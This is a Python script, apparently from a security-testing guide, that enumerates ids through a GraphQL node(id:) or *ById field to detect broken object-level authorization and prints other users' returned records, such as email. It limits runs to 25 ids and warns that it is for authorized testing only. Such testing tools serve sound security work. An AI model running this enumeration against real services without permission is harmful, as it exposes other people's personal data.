#!/usr/bin/env python3
"""
node_enumerator.py — demonstrate GraphQL BOLA via node(id:) or *ById over a SMALL range.

Relay global ids are usually base64("Type:intpk"). If the resolver doesn't check ownership,
iterating the inner integer returns other users' objects (guide §7). This helper queries either:
  - node(id:"<base64>")        (Relay global id), or
  - <field>(id:<n>)            (a *ById field, via --field)
over a small range, and reports which ids returned data.

Authorized testing only. Use YOUR OWN second account's ids to prove cross-user access; keep the
range tiny and cite the population from a list/total — do not scrape real PII (guide §24).
"""
import argparse, base64, json, sys
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # never crash a cp1252 console
except Exception:
    pass
try:
    import requests
except ImportError:
    sys.exit("pip install requests")


def gid(type_name, n):
    return base64.b64encode(f"{type_name}:{n}".encode()).decode()


def run_query(url, headers, query):
    try:
        r = requests.post(url, headers=headers, data=json.dumps({"query": query}), timeout=20)
        return r.json()
    except Exception as e:
        return {"errors": [{"message": str(e)}]}


def main():
    p = argparse.ArgumentParser(description="GraphQL node/*ById BOLA enumerator (authorized testing only).")
    p.add_argument("--url", required=True)
    p.add_argument("--token", help="YOUR account bearer token (the 'attacker' A)")
    p.add_argument("--type", default="User", help="GraphQL type for node(id) global-id encoding")
    p.add_argument("--field", help="use <field>(id:N) instead of node() (e.g. user, order, invoiceById)")
    p.add_argument("--fields", default="id email", help="fields to request")
    p.add_argument("--start", type=int, default=1)
    p.add_argument("--count", type=int, default=5, help="KEEP SMALL (default 5)")
    args = p.parse_args()

    if args.count > 25:
        sys.exit("Refusing count > 25 — prove the pattern small and cite population (guide §24).")

    headers = {"Content-Type": "application/json"}
    if args.token:
        headers["Authorization"] = f"Bearer {args.token}"

    print(f"== GraphQL BOLA probe ({'field '+args.field if args.field else 'node('+args.type+')'}): "
          f"ids {args.start}..{args.start+args.count-1} ==\n")
    hits = 0
    for n in range(args.start, args.start + args.count):
        if args.field:
            q = "{ %s(id:%d){ %s } }" % (args.field, n, args.fields)
            label = f"{args.field}(id:{n})"
        else:
            g = gid(args.type, n)
            q = '{ node(id:"%s"){ ... on %s { %s } } }' % (g, args.type, args.fields)
            label = f"{args.type}:{n} ({g})"
        data = run_query(args.url, headers, q)
        obj = (data.get("data") or {})
        val = obj.get(args.field) if args.field else obj.get("node")
        if val:
            hits += 1
            print(f"  {label}  -> {json.dumps(val)}")
        else:
            errs = data.get("errors")
            print(f"  {label}  -> null{' / '+errs[0].get('message','') if errs else ''}")

    print(f"\n-- {hits}/{args.count} ids returned data.")
    if hits > 1:
        print("-> Multiple distinct ids resolved -> likely BOLA. Confirm with the TWO-ACCOUNT test")
        print("  (this token = A; check one of the returned ids belongs to your account B). guide §7/§18")
        print("-> Scale: use aliases to fetch many in one request; cite population from a list total.")
    elif hits == 1:
        print("-> Only your own object resolved — confirm whether others are accessible (try B's id).")


if __name__ == "__main__":
    main()
